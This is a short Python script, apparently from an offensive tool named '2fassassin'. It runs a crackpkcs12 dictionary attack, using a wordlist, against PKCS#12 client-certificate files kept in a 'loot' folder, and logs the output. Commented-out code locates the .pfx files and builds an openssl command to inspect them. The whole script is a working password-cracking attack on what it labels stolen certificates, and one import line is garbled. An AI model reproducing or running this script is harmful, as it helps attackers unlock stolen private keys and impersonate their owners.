#!/usr/bin/env python

import os, sys, time, glob
import os.path
import re
import subprocess
from subprocess import Popen #PIPEort subprocess
import os, sys, glob

#
#command = "openssl pkcs12 -info -in /root/2fassassin/loot/ClientCert.pfx -nomacver -noout -passin pass:unknown".split()

def test():
    wordlist = "/root/2fassassin/crack/wordlist.txt"
    target = "/root/2fassassin/loot/*.pfx"
    sign = ""
    sign += "crackpkcs12 -v -b -d "
    sign += wordlist
    sign += " "
    sign += target
    sign += " "
    sign += "| tee crack.log"
    os.system(sign)

    #return secret
    sys.exit()


test()


'''
# show the pfx file in loot
pointer = "/root/2fassassin/loot"

def pathfinder():
    for file in os.listdir(pointer):
        if file.endswith(".pfx"):
            target = (os.path.join(pointer, file))
            return target
            sys.exit()


'''



'''
# command prints out openssl pcks12 ..

processor = "find /root/2fassassin/loot -type f -name \*.pfx"
p = subprocess.Popen(processor, stdout=subprocess.PIPE, shell=True)
(path, err) = p.communicate()
p_status = p.wait()
#print path

command = '"openssl pkcs12 -info -in %s -nomacver -noout -passin pass:unknown"' %path +".split()"

print command
'''
